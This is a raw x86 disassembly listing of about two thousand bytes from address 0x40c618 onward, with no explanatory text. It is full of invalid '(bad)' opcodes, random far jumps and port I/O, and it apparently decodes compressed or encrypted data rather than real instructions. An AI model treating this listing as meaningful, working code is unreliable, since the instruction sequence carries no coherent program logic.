  40c618:	adc    DWORD PTR [ebx+0x681d3348],0xc1e9146f
  40c622:	scas   eax,DWORD PTR es:[edi]
  40c623:	mov    DWORD PTR [edi+0x6e7985e7],esp
  40c629:	dec    ebp
  40c62a:	push   eax
  40c62b:	popa   
  40c62c:	dec    ebx
  40c62d:	call   0x297c:0xdb801410
  40c634:	test   al,0x71
  40c636:	and    BYTE PTR ds:0x2bd6fa6f,bh
  40c63c:	fcom   QWORD PTR [ebx-0x185c4c59]
  40c642:	pop    esi
  40c643:	loop   0x40c5e5
  40c645:	ss pop es
  40c647:	arpl   ax,sp
  40c649:	or     ecx,DWORD PTR [edx-0x72a355b8]
  40c64f:	or     DWORD PTR [bx-0x65a7],esp
  40c654:	sub    al,0x7c
  40c656:	out    0xfe,al
  40c658:	or     dl,BYTE PTR [edi-0x1aba596e]
  40c65e:	xor    bh,cl
  40c660:	(bad)  [edx]
  40c662:	(bad)  
  40c663:	xlat   BYTE PTR ds:[ebx]
  40c664:	imul   dx,WORD PTR ds:[esi+0x26ba4b3],0x23
  40c66d:	inc    edx
  40c66e:	shl    BYTE PTR [ebx-0x61],cl
  40c671:	push   ebx
  40c672:	cmp    ecx,DWORD PTR [ecx+esi*8]
  40c675:	pop    ds
  40c676:	aam    0x7a
  40c678:	push   eax
  40c679:	xchg   ebx,eax
  40c67a:	(bad)  
  40c67b:	push   edi
  40c67c:	mov    ecx,0x3025f80e
  40c681:	xchg   edx,eax
  40c682:	add    DWORD PTR [esi-0x54acba],edi
  40c688:	frstpm(287 only) 
  40c68a:	push   0xfffffff0
  40c68c:	mov    edx,0x7bb02da1
  40c691:	pop    es
  40c692:	mov    WORD PTR [ecx-0x50],gs
  40c695:	cmp    dl,BYTE PTR [edx+edx*4-0x79c5897e]
  40c69c:	shr    ecx,cl
  40c69e:	sub    ebx,DWORD PTR [ebx+0x76403da]
  40c6a4:	and    eax,0xd65e1c64
  40c6a9:	dec    ebx
  40c6aa:	push   esi
  40c6ab:	imul   ch
  40c6ad:	xchg   esi,eax
  40c6ae:	frstor [esi+0x476e3520]
  40c6b4:	in     eax,dx
  40c6b5:	fnstsw WORD PTR [ebp+0x46]
  40c6b8:	out    0xa7,eax
  40c6ba:	daa    
  40c6bb:	mov    bh,0xa7
  40c6bd:	inc    esp
  40c6be:	inc    ebx
  40c6bf:	mov    ebp,0x259836a0
  40c6c4:	hlt    
  40c6c5:	lods   eax,DWORD PTR ds:[esi]
  40c6c6:	pop    edi
  40c6c7:	pop    edi
  40c6c8:	push   edi
  40c6c9:	jge    0x40c6bb
  40c6cb:	(bad)  
  40c6cc:	mov    ecx,0x56221e80
  40c6d1:	and    esp,esp
  40c6d3:	lods   al,BYTE PTR ds:[esi]
  40c6d4:	or     BYTE PTR [ecx],0x5c
  40c6d7:	mov    dh,0xd7
  40c6d9:	mov    al,ds:0xc2b25149
  40c6de:	inc    eax
  40c6df:	lock fcomp QWORD PTR [eax]
  40c6e2:	and    bh,BYTE PTR [edx+0x7f]
  40c6e5:	cld    
  40c6e6:	jmp    0x95da7567
  40c6eb:	(bad)  
  40c6ec:	cwde   
  40c6ed:	imul   esp,ebx,0xffffffd0
  40c6f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6f1:	push   ds
  40c6f2:	jbe    0x40c698
  40c6f4:	inc    esi
  40c6f5:	cli    
  40c6f6:	test   al,0xd2
  40c6f8:	jns    0x40c6e0
  40c6fa:	pop    esp
  40c6fb:	mov    edx,0xc2ee3dcc
  40c700:	fdivr  QWORD PTR [ebx+0x55]
  40c703:	out    dx,eax
  40c704:	push   ebx
  40c705:	out    dx,al
  40c706:	std    
  40c707:	mov    bh,0xef
  40c709:	stc    
  40c70a:	dec    BYTE PTR [ebp-0x6f]
  40c70d:	sub    dl,BYTE PTR [ebx]
  40c70f:	mov    al,ds:0x95dd44b3
  40c714:	scas   eax,DWORD PTR es:[edi]
  40c715:	jo     0x40c6ba
  40c717:	add    al,BYTE PTR [edx]
  40c719:	push   0x1f42a60
  40c71e:	inc    ecx
  40c71f:	push   esi
  40c720:	cmp    bl,BYTE PTR [ebp+edi*2+0x321f936]
  40c727:	pop    ds
  40c728:	add    eax,0x59edf11c
  40c72d:	inc    eax
  40c72e:	out    dx,eax
  40c72f:	xor    al,0x32
  40c731:	lods   al,BYTE PTR ds:[esi]
  40c732:	scas   al,BYTE PTR es:[edi]
  40c733:	addr16 inc ecx
  40c735:	leave  
  40c736:	xor    BYTE PTR [ecx-0x392a184a],0xeb
  40c73d:	push   ebx
  40c73e:	sub    esi,esp
  40c740:	xor    eax,0x98bf3c04
  40c745:	dec    ebx
  40c746:	xor    eax,DWORD PTR [edx-0x64e6065e]
  40c74c:	dec    esi
  40c74d:	loop   0x40c76f
  40c74f:	outs   dx,DWORD PTR ds:[esi]
  40c750:	jge    0x40c7be
  40c752:	aas    
  40c753:	shl    BYTE PTR [edi],cl
  40c755:	adc    edx,DWORD PTR [ebp+0x7b3983d2]
  40c75b:	imul   ebx,DWORD PTR [eax],0xaa15f710
  40c761:	mov    DWORD PTR [ebp+0x41],ebp
  40c764:	and    BYTE PTR [eax-0x3f6830e0],bl
  40c76a:	dec    ecx
  40c76b:	sbb    al,0x47
  40c76d:	xor    al,0x95
  40c76f:	ins    DWORD PTR es:[edi],dx
  40c770:	data16 ja 0x40c712
  40c773:	test   edx,eax
  40c775:	cmc    
  40c776:	push   esp
  40c777:	add    al,BYTE PTR [eax-0x24]
  40c77a:	add    dl,bl
  40c77c:	bsr    ebp,ecx
  40c77f:	mov    ah,ch
  40c781:	lea    esp,[ecx]
  40c783:	inc    ecx
  40c784:	les    edx,FWORD PTR [ebx]
  40c786:	add    al,0xa9
  40c788:	shl    ah,cl
  40c78a:	loop   0x40c763
  40c78c:	(bad)  
  40c78d:	push   edx
  40c78e:	xor    esp,DWORD PTR [ecx]
  40c790:	push   ds
  40c791:	ficomp DWORD PTR [edx-0x23]
  40c794:	push   cs
  40c795:	inc    eax
  40c796:	outs   dx,BYTE PTR ds:[esi]
  40c797:	mov    ebx,DWORD PTR [edi-0x38]
  40c79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c79b:	jbe    0x40c812
  40c79d:	mov    BYTE PTR [esi],al
  40c79f:	cmp    DWORD PTR ds:[eax+0x62a749ca],esp
  40c7a6:	jmp    0x40c81e
  40c7a8:	inc    ebp
  40c7a9:	repnz or DWORD PTR [esi+edx*4-0x2f],eax
  40c7ae:	push   ss
  40c7af:	mov    al,ds:0xef22de5c
  40c7b4:	push   eax
  40c7b5:	jge    0x40c7fa
  40c7b7:	dec    ebp
  40c7b8:	and    ebx,edi
  40c7ba:	jno    0x40c79b
  40c7bc:	pop    ecx
  40c7bd:	xor    al,0xe
  40c7bf:	imul   edx,ecx,0x31633ef1
  40c7c5:	gs dec esp
  40c7c7:	xchg   ebp,eax
  40c7c8:	or     edi,ecx
  40c7ca:	imul   edx,eax,0x4e5c2305
  40c7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d1:	pop    ecx
  40c7d2:	sbb    al,BYTE PTR [eax]
  40c7d4:	adc    eax,0xfc2b394e
  40c7d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7da:	xor    DWORD PTR [ebx-0x286f0075],0xffffff87
  40c7e1:	loop   0x40c780
  40c7e3:	(bad)  
  40c7e5:	xchg   edi,eax
  40c7e6:	sar    DWORD PTR [esi+0x57282320],cl
  40c7ec:	xchg   ecx,eax
  40c7ed:	aam    0x1b
  40c7ef:	popf   
  40c7f0:	add    DWORD PTR [esp+eax*1],edx
  40c7f3:	inc    edx
  40c7f4:	ret    
  40c7f5:	xor    ebp,DWORD PTR [ebx+eax*4-0x73]
  40c7f9:	(bad)  
  40c7fa:	sbb    ecx,DWORD PTR [edi+0x67a97dab]
  40c800:	jmp    0x40c807
  40c802:	repnz or DWORD PTR [ebp+0x44f97880],edx
  40c809:	pusha  
  40c80a:	adc    eax,0xa5f96f8b
  40c80f:	add    dh,BYTE PTR [eax-0x99353cb]
  40c815:	lods   eax,DWORD PTR ds:[esi]
  40c816:	sahf   
  40c817:	popa   
  40c818:	ficom  DWORD PTR [ebx-0x33e246aa]
  40c81e:	fcmovbe st,st(1)
  40c820:	add    ebp,DWORD PTR ds:0x39fd747e
  40c826:	sub    eax,0x7d84bb12
  40c82b:	adc    dl,bh
  40c82d:	and    al,0x7a
  40c830:	inc    ecx
  40c831:	or     eax,0x46b0f058
  40c836:	das    
  40c837:	mov    ch,bh
  40c839:	das    
  40c83a:	lds    eax,FWORD PTR [esi-0x1d2fcf16]
  40c840:	clc    
  40c841:	jbe    0x40c7dc
  40c843:	fiadd  DWORD PTR [edx+0x41]
  40c846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c847:	rol    BYTE PTR [ecx+0x3048b415],1
  40c84d:	mov    bl,0xa3
  40c84f:	push   eax
  40c850:	mov    esp,0x264dd374
  40c855:	adc    edi,DWORD PTR [eax-0x25]
  40c858:	pop    es
  40c859:	out    dx,al
  40c85a:	mov    edx,0x39c7ce36
  40c85f:	mov    DWORD PTR [eax+ebx*1-0x47df65be],ebx
  40c866:	in     ax,0x68
  40c869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c86a:	mov    dh,0x2b
  40c86c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c86d:	arpl   ax,si
  40c86f:	inc    edx
  40c870:	(bad)  
  40c871:	sub    DWORD PTR [ebx-0x61],edx
  40c874:	jmp    0x89778388
  40c879:	fisub  WORD PTR [edx-0xb]
  40c87c:	xor    al,0xb9
  40c87e:	sbb    dl,BYTE PTR [ebx-0x6a22f9dd]
  40c884:	dec    edx
  40c885:	call   0x9908:0xb8408822
  40c88c:	xor    eax,0xbc30078c
  40c891:	jns    0x40c8dd
  40c893:	je     0x40c893
  40c895:	mov    ch,0x5e
  40c897:	mov    eax,ds:0x862bcd62
  40c89c:	retf   0xac9b
  40c89f:	ja     0x40c8c1
  40c8a1:	gs inc edi
  40c8a3:	sbb    al,0xe4
  40c8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8a6:	and    ecx,DWORD PTR [eax+0x78]
  40c8a9:	jns    0x40c8ed
  40c8ab:	xor    esi,DWORD PTR [edx]
  40c8ad:	int3   
  40c8ae:	xchg   esp,eax
  40c8af:	jnp    0x40c877
  40c8b1:	sbb    eax,0xce26e975
  40c8b6:	les    esi,FWORD PTR [ebp+0x5b]
  40c8b9:	jno    0x40c926
  40c8bb:	mov    al,0x5c
  40c8bd:	jns    0x40c8dd
  40c8bf:	pop    ecx
  40c8c0:	jecxz  0x40c88b
  40c8c2:	cmp    al,0x30
  40c8c4:	(bad)  
  40c8c5:	jmp    0x20e8d1f4
  40c8ca:	inc    esp
  40c8cb:	xchg   ebp,eax
  40c8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8cd:	add    al,BYTE PTR ds:[eax]
  40c8d0:	adc    dh,BYTE PTR [edi+0x2f]
  40c8d3:	mov    dl,0x9e
  40c8d5:	cmp    ecx,DWORD PTR [esi+0x308d015a]
  40c8db:	sbb    eax,0xed086c93
  40c8e0:	mov    eax,ds:0xb6159736
  40c8e5:	pop    ebx
  40c8e6:	dec    ecx
  40c8e7:	adc    eax,0x80533c59
  40c8ec:	mov    cs,WORD PTR [ebx]
  40c8ee:	pop    es
  40c8ef:	jge    0x40c8f6
  40c8f1:	aad    0x15
  40c8f3:	cmp    ch,BYTE PTR [ebx+0x4b]
  40c8f6:	sub    ch,BYTE PTR [edx+0x4cf744ea]
  40c8fc:	jmp    0x4d46:0xebd16265
  40c903:	test   eax,0x4a399c24
  40c909:	test   eax,0x79301908
  40c90e:	in     eax,0xf6
  40c910:	arpl   si,si
  40c912:	push   ebp
  40c913:	add    ebx,eax
  40c915:	jg     0x40c994
  40c917:	xlat   BYTE PTR ds:[ebx]
  40c918:	inc    esi
  40c919:	cmp    al,BYTE PTR [eax+0x4848ef64]
  40c91f:	cmp    eax,0x6578e6a0
  40c924:	das    
  40c925:	xchg   esi,eax
  40c926:	mov    ecx,DWORD PTR [ebp+0x640cc8cd]
  40c92c:	xchg   esp,eax
  40c92d:	mov    ds:0xc9019598,al
  40c932:	add    al,0xd7
  40c934:	inc    esi
  40c935:	or     ebp,DWORD PTR [ecx-0x2558b364]
  40c93b:	xor    DWORD PTR [ebp-0x51a5a912],0xffffff8e
  40c942:	sti    
  40c943:	enter  0x501e,0x6c
  40c947:	sbb    ah,BYTE PTR [esi]
  40c949:	pop    esi
  40c94a:	(bad)  
  40c94c:	add    esp,edi
  40c94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c94f:	stos   DWORD PTR es:[edi],eax
  40c950:	arpl   cx,cx
  40c952:	adc    esi,DWORD PTR [edi+0x28]
  40c955:	jecxz  0x40c9d3
  40c957:	jo     0x40c9bb
  40c959:	cwde   
  40c95a:	adc    DWORD PTR [edi+0x31],0xffffffd2
  40c95e:	test   BYTE PTR [ecx],0xff
  40c961:	mov    gs,esi
  40c963:	or     DWORD PTR [edi],edi
  40c965:	in     eax,0x5b
  40c967:	lahf   
  40c968:	inc    ebp
  40c969:	cdq    
  40c96a:	outs   dx,BYTE PTR ds:[esi]
  40c96b:	arpl   WORD PTR [eax-0x64118cb0],bx
  40c971:	pop    ebp
  40c972:	pop    ecx
  40c973:	sub    eax,0x5b4242d
  40c979:	es xor ebx,ebp
  40c97c:	into   
  40c97d:	fnsave [esi]
  40c97f:	(bad)  
  40c980:	xchg   edi,eax
  40c981:	stos   DWORD PTR es:[edi],eax
  40c982:	fistp  WORD PTR [ecx]
  40c984:	xchg   DWORD PTR [eax],ecx
  40c986:	bound  ebx,QWORD PTR [ebp+0xc41eb28]
  40c98c:	not    BYTE PTR [edi+0x1c70cc7e]
  40c992:	pushf  
  40c993:	sub    eax,0x5c176405
  40c998:	push   eax
  40c999:	or     BYTE PTR [ecx-0x6246ca8c],bh
  40c99f:	mov    edx,DWORD PTR ds:0xd2cb662d
  40c9a5:	repnz mov ds:0xef1ccfb9,al
  40c9ab:	in     al,0xcb
  40c9ad:	and    al,0xe8
  40c9af:	add    eax,DWORD PTR [ebx+0x63]
  40c9b2:	mov    ax,ds:0x6b7084da
  40c9b8:	push   0xd136f506
  40c9bd:	adc    BYTE PTR [ebx],al
  40c9bf:	lahf   
  40c9c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9c1:	xor    eax,DWORD PTR [edx-0x24f0a347]
  40c9c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c8:	adc    dl,bl
  40c9ca:	scas   eax,DWORD PTR es:[edi]
  40c9cb:	add    ah,cl
  40c9cd:	cmp    eax,0xf917cab5
  40c9d2:	inc    DWORD PTR [esi-0x65b1ad61]
  40c9d8:	and    DWORD PTR [edi+0x68],ebp
  40c9db:	jne    0x40c9e1
  40c9dd:	adc    al,0xbe
  40c9df:	das    
  40c9e0:	mov    ?,WORD PTR [esi-0x50]
  40c9e3:	dec    ecx
  40c9e4:	call   0x367a5c1e
  40c9e9:	xchg   BYTE PTR [ebx+edx*8-0x7e5c37c4],bh
  40c9f0:	leave  
  40c9f1:	sub    DWORD PTR [ebx-0x578ea4e2],edi
  40c9f7:	lods   al,BYTE PTR ds:[esi]
  40c9f8:	cmp    BYTE PTR [ecx],0xc1
  40c9fb:	xor    edx,DWORD PTR [edi]
  40c9fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9fe:	scas   eax,DWORD PTR es:[edi]
  40c9ff:	lds    ecx,FWORD PTR [ebp+ebp*2-0x4f3504db]
  40ca06:	in     al,dx
  40ca07:	test   eax,0xaf0f7c7e
  40ca0c:	loop   0x40ca84
  40ca0e:	cld    
  40ca0f:	or     eax,0x25a7535e
  40ca14:	and    esi,DWORD PTR [ecx-0x24]
  40ca17:	(bad)  
  40ca18:	sahf   
  40ca19:	xor    edi,DWORD PTR [ecx+0x11]
  40ca1c:	xor    al,0x21
  40ca1e:	cmp    al,BYTE PTR [eax]
  40ca20:	mov    ch,0xc8
  40ca22:	inc    eax
  40ca23:	call   0xb8c9b45e
  40ca28:	clc    
  40ca29:	jmp    0xc807:0xc69bef87
  40ca30:	xchg   edx,eax
  40ca31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca32:	es adc al,0xa5
  40ca35:	leave  
  40ca36:	pop    ds
  40ca37:	jmp    0x40c9c6
  40ca39:	jne    0x40ca8e
  40ca3b:	mov    cl,0xb3
  40ca3d:	inc    eax
  40ca3e:	es daa 
  40ca40:	lahf   
  40ca41:	ja     0x40ca62
  40ca43:	adc    dl,BYTE PTR [ebx+0x5c]
  40ca46:	test   eax,0x45964ebc
  40ca4b:	setbe  BYTE PTR [edi-0x26]
  40ca4f:	out    0xf7,eax
  40ca51:	call   DWORD PTR [ecx+0xedda308]
  40ca57:	aam    0xb3
  40ca59:	ror    DWORD PTR [edi*4+0x55d74ad6],1
  40ca60:	inc    edi
  40ca61:	scas   eax,DWORD PTR es:[edi]
  40ca62:	add    eax,0xaf45a241
  40ca67:	cmp    DWORD PTR [eax],ebx
  40ca69:	jo     0x40c9fc
  40ca6b:	cld    
  40ca6c:	lods   al,BYTE PTR ds:[esi]
  40ca6d:	and    DWORD PTR [esi+esi*1-0x7740f93d],esp
  40ca74:	xchg   BYTE PTR [edx-0x12],bh
  40ca77:	lock adc bl,BYTE PTR [esi]
  40ca7a:	mov    ds:0x4eb4f250,al
  40ca7f:	loop   0x40ca2a
  40ca81:	fbstp  TBYTE PTR [esi-0x53]
  40ca84:	sbb    ch,BYTE PTR [edi+edx*1-0x13]
  40ca88:	aaa    
  40ca89:	cmp    BYTE PTR ds:0xfb384335,ah
  40ca8f:	sub    ah,0xf0
  40ca92:	mov    esp,0xe5e12759
  40ca97:	push   ecx
  40ca98:	das    
  40ca99:	mov    ecx,0x43a88862
  40ca9e:	(bad)  
  40ca9f:	int    0x77
  40caa1:	mov    ds:0xe5d8482,eax
  40caa6:	push   ebx
  40caa7:	aad    0x32
  40caa9:	jmp    0xf1fb:0x57bfc231
  40cab0:	bound  ecx,QWORD PTR [esi]
  40cab2:	ficom  WORD PTR cs:[ebp+0x7b]
  40cab6:	in     al,0x58
  40cab8:	adc    bh,BYTE PTR [edx+0x4a06ca6d]
  40cabe:	mov    al,0xde
  40cac0:	jo     0x40ca8f
  40cac2:	int    0xf1
  40cac4:	inc    edi
  40cac5:	leave  
  40cac6:	pop    ebx
  40cac7:	mov    dl,0x57
  40cac9:	js     0x40cb42
  40cacb:	std    
  40cacc:	jno    0x40ca5c
  40cace:	add    DWORD PTR [eax+0x1c],ecx
  40cad1:	in     al,0xcc
  40cad3:	push   edi
  40cad4:	enter  0xf074,0xba
  40cad8:	xor    al,0x11
  40cada:	push   edx
  40cadb:	ins    DWORD PTR es:[edi],dx
  40cadc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cadd:	add    ebx,ebx
  40cadf:	imul   esp,DWORD PTR [ecx+0x93eac5d],0xffffffd2
  40cae6:	adc    eax,0x2547cdbd
  40caeb:	lods   al,BYTE PTR ds:[esi]
  40caec:	dec    eax
  40caed:	add    DWORD PTR [eax-0x413ae52d],0x46f1cf2
  40caf7:	xor    DWORD PTR [edx+0x645d5a55],ebp
  40cafd:	adc    al,0xd0
  40caff:	mov    ds:0x97d0399e,al
  40cb04:	jmp    0x40cab8
  40cb06:	adc    al,cl
  40cb08:	lea    ebp,[ebx+0xf]
  40cb0b:	xchg   DWORD PTR [ebx],ebp
  40cb0d:	test   ebx,eax
  40cb0f:	pushf  
  40cb10:	pusha  
  40cb11:	ins    DWORD PTR es:[edi],dx
  40cb12:	adc    eax,esp
  40cb14:	daa    
  40cb15:	push   ebx
  40cb16:	fs test eax,0x1b717af9
  40cb1c:	(bad)  
  40cb1e:	fcomip st,st(7)
  40cb20:	ss jo  0x40caf0
  40cb23:	call   0xec1f:0x4625eb0f
  40cb2a:	pop    ebx
  40cb2b:	fwait
  40cb2c:	bound  edi,QWORD PTR [ecx+ebp*1-0x6c221c2a]
  40cb33:	pop    esi
  40cb34:	iret   
  40cb35:	pop    esp
  40cb36:	xchg   esi,eax
  40cb37:	dec    ebx
  40cb38:	and    BYTE PTR [edi],bl
  40cb3a:	addps  xmm4,XMMWORD PTR [eax-0x64b4a174]
  40cb41:	add    eax,0x50f2a677
  40cb46:	cs js  0x40cacb
  40cb49:	mov    dl,0x5b
  40cb4b:	lds    ebx,FWORD PTR [esi+0x53]
  40cb4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb4f:	fdiv   DWORD PTR [edi+0x45]
  40cb52:	lea    edi,[edi]
  40cb54:	repz xchg ebp,ebx
  40cb57:	sbb    DWORD PTR [ebx-0x20],0x24
  40cb5b:	or     eax,DWORD PTR [edx+0xd]
  40cb5e:	jmp    0xa0bff7ed
  40cb63:	xchg   ebp,eax
  40cb64:	mov    edx,0x34400a1b
  40cb69:	pop    eax
  40cb6a:	mov    ds:0x449f5293,al
  40cb6f:	test   al,0xc4
  40cb71:	push   DWORD PTR cs:[esi+0x5b]
  40cb75:	or     DWORD PTR [ecx+0x4cd6130a],esi
  40cb7b:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40cb7d:	xor    esi,ebx
  40cb7f:	xchg   edx,eax
  40cb80:	pop    esp
  40cb82:	dec    edx
  40cb83:	mov    ds:0xf75390c,al
  40cb88:	inc    ebp
  40cb89:	(bad)  
  40cb8a:	push   ecx
  40cb8b:	cwde   
  40cb8c:	fucom  st(7)
  40cb8e:	daa    
  40cb8f:	mov    eax,0x436afd55
  40cb94:	or     DWORD PTR [eax],esp
  40cb96:	test   al,0x14
  40cb98:	dec    edx
  40cb99:	icebp  
  40cb9a:	jbe    0x9b4692df
  40cba0:	(bad)  
  40cba1:	xor    eax,0xf8f6cbec
  40cba6:	pop    edx
  40cba7:	xchg   ebp,eax
  40cba8:	add    al,0xa7
  40cbaa:	xor    bl,0x73
  40cbad:	fnstenv [edi+0x36cb7273]
  40cbb3:	adc    al,0x26
  40cbb5:	push   ecx
  40cbb6:	es push esi
  40cbb8:	mov    al,ds:0xbdcebe50
  40cbbd:	loope  0x40cbda
  40cbbf:	sbb    DWORD PTR [edx+0x52b8ccbb],eax
  40cbc5:	xor    eax,0x9a3f4447
  40cbca:	test   al,0x86
  40cbcc:	dec    ebp
  40cbcd:	ins    BYTE PTR es:[edi],dx
  40cbce:	cwde   
  40cbcf:	nop
  40cbd0:	ins    DWORD PTR es:[edi],dx
  40cbd1:	dec    ebx
  40cbd2:	or     al,0x8e
  40cbd4:	fdivr  DWORD PTR [edi-0xf149233]
  40cbda:	jmp    0x8bdca44c
  40cbdf:	iret   
  40cbe0:	inc    ebp
  40cbe1:	jbe    0x40cc1c
  40cbe3:	or     dl,0x9c
  40cbe6:	cwde   
  40cbe7:	sub    al,0x47
  40cbe9:	and    esp,DWORD PTR [ebx]
  40cbeb:	mov    bh,0x22
  40cbed:	mov    esp,0xe3af3adf
  40cbf2:	mov    ds:0x7527147f,eax
  40cbf7:	dec    ebx
  40cbf8:	mov    bh,0xc4
  40cbfa:	inc    esp
  40cbfb:	mov    ch,0x12
  40cbfd:	pop    ebx
  40cbfe:	sbb    ebx,eax
  40cc00:	nop
  40cc01:	stc    
  40cc02:	jnp    0x40cba8
  40cc04:	inc    esi
  40cc05:	ret    0xf56f
  40cc08:	cmp    esp,edx
  40cc0a:	test   eax,0xefb3f1ab
  40cc0f:	(bad)  
  40cc10:	int    0x88
  40cc12:	mov    ah,BYTE PTR ds:0x28bb714c
  40cc18:	lea    ebp,[ecx+0x1]
  40cc1b:	stos   DWORD PTR es:[edi],eax
  40cc1c:	std    
  40cc1d:	pop    ss
  40cc1e:	scas   al,BYTE PTR es:[edi]
  40cc1f:	xor    eax,DWORD PTR [ebp+edi*8-0x67]
  40cc23:	icebp  
  40cc24:	outs   dx,BYTE PTR ds:[esi]
  40cc25:	push   0x56ee5178
  40cc2a:	xor    BYTE PTR [ecx-0x22],0x4e
  40cc2e:	jge    0x40cbbc
  40cc30:	sbb    eax,0xcd6c507e
  40cc35:	xor    al,0xdb
  40cc37:	mov    esi,DWORD PTR [ebx]
  40cc39:	cwde   
  40cc3a:	mov    ch,0x6
  40cc3c:	cmp    eax,0x6336c47c
  40cc41:	stos   BYTE PTR es:[edi],al
  40cc42:	aas    
  40cc43:	mov    bl,0x57
  40cc45:	retf   
  40cc46:	imul   esi,DWORD PTR [eax-0x1f637f11],0xffffffaa
  40cc4d:	cmp    BYTE PTR [esi],ch
  40cc4f:	aas    
  40cc50:	push   0xa
  40cc52:	adc    ebp,DWORD PTR [ecx-0x6a469fa1]
  40cc58:	mov    dl,0xb5
  40cc5a:	out    0x9b,al
  40cc5c:	and    bl,BYTE PTR [edx+0xd]
  40cc5f:	jbe    0x40cc2d
  40cc61:	push   ss
  40cc62:	inc    edi
  40cc63:	jnp    0x40cc57
  40cc65:	and    al,0xac
  40cc67:	jle    0x40ccb1
  40cc69:	ret    0x3862
  40cc6c:	inc    esp
  40cc6e:	dec    edi
  40cc6f:	push   es
  40cc70:	dec    eax
  40cc71:	mov    ecx,0x65b4d0e6
  40cc76:	jno    0x40cc94
  40cc78:	idiv   DWORD PTR [ebx+0x6e]
  40cc7b:	and    al,0x6a
  40cc7d:	cmp    edx,DWORD PTR [ebx-0x12002d2f]
  40cc83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc84:	jmp    0xc8613469
  40cc89:	jl     0x40cc53
  40cc8b:	dec    esi
  40cc8c:	inc    esi
  40cc8d:	mov    WORD PTR ds:0x1ba19e7d,ds
  40cc93:	int    0x6a
  40cc95:	mul    DWORD PTR [edx]
  40cc97:	dec    edx
  40cc98:	imul   ebp,DWORD PTR [ebx-0x34],0x89e0ab
  40cc9f:	adc    DWORD PTR [esi-0x64],ecx
  40cca2:	dec    ebx
  40cca3:	lock and ecx,DWORD PTR [ebx-0x1a]
  40cca7:	jg     0x40cca0
  40cca9:	adc    dl,BYTE PTR [esi]
  40ccab:	sti    
  40ccac:	add    BYTE PTR [edx],0x9c
  40ccaf:	pushf  
  40ccb0:	dec    ebp
  40ccb1:	mov    dh,0x57
  40ccb3:	push   esp
  40ccb4:	dec    edi
  40ccb5:	xor    DWORD PTR [edi-0x3f],esi
  40ccb8:	adc    dl,ah
  40ccba:	popf   
  40ccbb:	mov    ebx,0x374b94c8
  40ccc0:	dec    ecx
  40ccc1:	or     BYTE PTR [edx],ch
  40ccc3:	lds    esi,FWORD PTR [esi+0x6687648d]
  40ccc9:	or     eax,0x7e40cd97
  40ccce:	xor    BYTE PTR [ecx+eiz*2+0x8],bh
  40ccd2:	and    DWORD PTR [edx-0x23],0x4b290dc6
  40ccd9:	retf   
  40ccda:	adc    eax,0x9be0c4e8
  40ccdf:	int3   
  40cce0:	lahf   
  40cce1:	add    eax,eax
  40cce3:	push   ebx
  40cce4:	js     0x40cc8d
  40cce6:	or     bl,al
  40cce8:	fwait
  40cce9:	repnz and cl,BYTE PTR [ebx+0x54f44b1c]
  40ccf0:	inc    edi
  40ccf1:	mov    ch,0xc
  40ccf3:	fldenv [eax+0x1fe4665f]
  40ccf9:	iret   
  40ccfa:	inc    esi
  40ccfb:	mov    ah,0x9a
  40ccfd:	rcl    BYTE PTR [edx],cl
  40ccff:	sbb    DWORD PTR [esi+edi*1-0x9],ebp
  40cd03:	ficomp DWORD PTR [edi]
  40cd05:	pop    ebp
  40cd06:	test   BYTE PTR [ebx+0x21a5b6ba],al
  40cd0c:	and    DWORD PTR [edi+0x24],0x200692b
  40cd13:	loope  0x40cd03
  40cd15:	fild   QWORD PTR [eax]
  40cd17:	cmp    al,0xb7
  40cd19:	jo     0x40cd35
  40cd1b:	aaa    
  40cd1c:	imul   BYTE PTR [ebx-0x6ec79f07]
  40cd22:	pop    esi
  40cd23:	xor    DWORD PTR [ecx+0x57],ecx
  40cd26:	inc    ebx
  40cd27:	mov    ebx,edi
  40cd29:	aaa    
  40cd2a:	sti    
  40cd2b:	(bad)  
  40cd2c:	pop    esi
  40cd2d:	xor    al,0xd2
  40cd2f:	or     al,0x35
  40cd31:	xor    DWORD PTR [eax-0x5d8477f4],0x6b
  40cd38:	imul   esp,DWORD PTR [ebx],0x6d424f5d
  40cd3e:	and    BYTE PTR [ecx],dh
  40cd40:	das    
  40cd41:	mov    ebp,0xd165cfda
  40cd46:	jmp    0x40cd51
  40cd48:	retf   
  40cd49:	test   eax,0xc79ec1e2
  40cd4e:	xor    eax,0xf9c8f3f1
  40cd53:	sbb    esi,edx
  40cd55:	addr16 mov eax,?
  40cd58:	jne    0x40cdbe
  40cd5a:	jb     0x40cd0b
  40cd5c:	pop    ss
  40cd5d:	rol    BYTE PTR [eax-0x3],1
  40cd60:	mov    ah,0xf5
  40cd62:	jo     0x40cdac
  40cd64:	(bad)  
  40cd65:	jp     0x40cd54
  40cd67:	pop    ebp
  40cd68:	mov    ds:0x3c38cc29,al
  40cd6d:	add    ebp,DWORD PTR [esi-0x75]
  40cd70:	inc    esp
  40cd71:	pusha  
  40cd72:	js     0x40cdb8
  40cd74:	repnz cmp DWORD PTR [eax-0x37],esi
  40cd78:	dec    eax
  40cd79:	jmp    0x40cd9e
  40cd7b:	out    dx,al
  40cd7c:	(bad)  
  40cd7e:	xlat   BYTE PTR ds:[ebx]
  40cd7f:	out    0xeb,eax
  40cd81:	sub    esi,DWORD PTR [esi-0x5d]
  40cd84:	jg     0x40cdb8
